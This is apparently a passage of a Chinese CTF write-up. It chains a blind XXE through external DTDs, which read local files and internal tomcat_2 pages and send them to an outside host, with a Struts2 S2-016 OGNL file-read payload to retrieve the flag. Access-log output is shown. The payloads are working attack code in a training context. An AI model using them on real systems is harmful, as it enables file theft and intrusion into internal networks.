获得用户 `superadmin_hahaha_2333: f5a5a608`

**XXE**

根据代码启用了 `ExpandEntityReferences` ，并且限制了提交 XML 长度为 1000 ，无回显，选择 XXE 盲打。<br>
由于存在长度限制，因此选择使用外部 DTD 加载的方式进行攻击。发送 payload 如下：

```
/rest/user/nicaicaikan_url_23333_secret?xmlData=&lt;!DOCTYPE data SYSTEM "http://111.222.333.444/stwo.dtd"&gt;&lt;data&gt;%26send;&lt;/data&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

构造读取文件 `readfile.dtd`：

```
&lt;!ENTITY % file SYSTEM "file:///flag/hint.txt"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://111.222.333.444/?%file;'&gt;"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">%all;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

读取得到：

> Flag in intranet tomcat_2 server 8080 port.

构造读取文件 `tomcat2.dtd`：

```
&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://111.222.333.444/?%file;'&gt;"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">%all;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

读取得到：

> try to visit hello.action.

构造读取文件 `tomcat2h.dtd`：

```
&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/hello.action"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://111.222.333.444/?%file;'&gt;"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">%all;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

读取得到：

> This is Struts2 Demo APP, try to read /flag/flag.txt

尝试直接使用 S2-016 命令执行 PoC `cat /flag/flag.txt` 文件时，提示只允许读取文件，于是构造如下 OGNL 表达式：

```
$`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">#context["xwork.MethodAccessor.denyMethodExecution"]=false<br style="margin: 0px; padding: 0px; max-width: 100%;">#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess")<br style="margin: 0px; padding: 0px; max-width: 100%;">#f.setAccessible(true)<br style="margin: 0px; padding: 0px; max-width: 100%;">#f.set(#_memberAccess,true)<br style="margin: 0px; padding: 0px; max-width: 100%;">#w=new java.io.File("/flag/flag.txt")<br style="margin: 0px; padding: 0px; max-width: 100%;">#a=new java.io.FileInputStream(#w)<br style="margin: 0px; padding: 0px; max-width: 100%;">#b=new java.io.InputStreamReader(#a)<br style="margin: 0px; padding: 0px; max-width: 100%;">#c=new java.io.BufferedReader(#b)<br style="margin: 0px; padding: 0px; max-width: 100%;">#d=new char[60]<br style="margin: 0px; padding: 0px; max-width: 100%;">#c.read(#d)<br style="margin: 0px; padding: 0px; max-width: 100%;">#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()<br style="margin: 0px; padding: 0px; max-width: 100%;">#genxor.println(#d)<br style="margin: 0px; padding: 0px; max-width: 100%;">#genxor.flush()<br style="margin: 0px; padding: 0px; max-width: 100%;">#genxor.close()<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

构造 struts2 攻击 `stwo.dtd`：

```
&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/hello.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23w%3Dnew%20java.io.File(%22%2Fflag%2Fflag.txt%22)%2C%23a%3Dnew%20java.io.FileInputStream(%23w)%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B60%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://111.222.333.444/?%file;'&gt;"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">%all;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

最终从访问日志中获得 flag：

```
116.85.48.104 - - [20/Apr/2018:22:24:30 +0800] "GET /stwo.dtd HTTP/1.1" 200 1067 "-" "Java/1.8.0_151"<br style="margin: 0px; padding: 0px; max-width: 100%;">116.85.48.104 - - [20/Apr/2018:22:24:31 +0800] "GET /?DDCTF`{`You_Got_it_WonDe2fUl_Man_ha2333_CQjXiolS2jqUbYIbtrOb`}` HTTP/1.1" 404 496 "-" "Java/1.8.0_151"
```
